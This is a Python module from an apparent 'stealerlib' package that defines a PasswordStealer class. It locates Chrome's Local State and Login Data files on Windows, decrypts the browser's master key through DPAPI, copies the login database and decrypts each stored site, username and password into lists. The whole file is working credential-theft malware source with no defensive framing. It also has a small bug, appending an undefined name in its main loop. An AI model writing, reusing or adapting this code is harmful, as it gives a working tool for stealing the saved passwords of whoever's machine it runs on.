#!/usr/bin/python
# -*- coding: utf-8 -*-
"""
    @author:  codeuk
    @package: stealerlib/browser/passwords.py
"""

from stealerlib.browser import *
from stealerlib.exceptions import quiet


class PasswordStealer:

    def __init__(self):
        self.usernames = []
        self.passwords = []
        self.credentials = []

        self.chrome_path = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State'
        self.db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
        self.key = self.get_encryption_key()

    @quiet
    def get_encryption_key(self) -> str:
        with open(self.chrome_path, "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        mkey = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        mkey = mkey[5:]
        mkey = win32crypt.CryptUnprotectData(mkey, None, None, None, 0)[1]

        return mkey

    @quiet
    def decrypt_password(self, password: str, key: str) -> str:
        try:
            iv = password[3:15]
            password = password[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)

            return cipher.decrypt(password)[:-16].decode()
        except:
            try:
                return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
            except:
                return ""

    @quiet
    def get_passwords(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            select_query = "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created"

            db_file = "{}\ChromeData.db".format(tmpdir)
            shutil.copyfile(self.db_path, db_file)
            db = sqlite3.connect(db_file)
            cursor = db.cursor()
            cursor.execute(select_query)

            for i, row in enumerate(cursor.fetchall()):
                origin_url = row[0] 
                username = row[2]
                password = self.decrypt_password(row[3], self.key)   

                if not username or not password:
                    continue

                self.passwords.append(passwords)
                self.usernames.append(username)
                self.credentials.append((origin_url, username, password))

            db.close()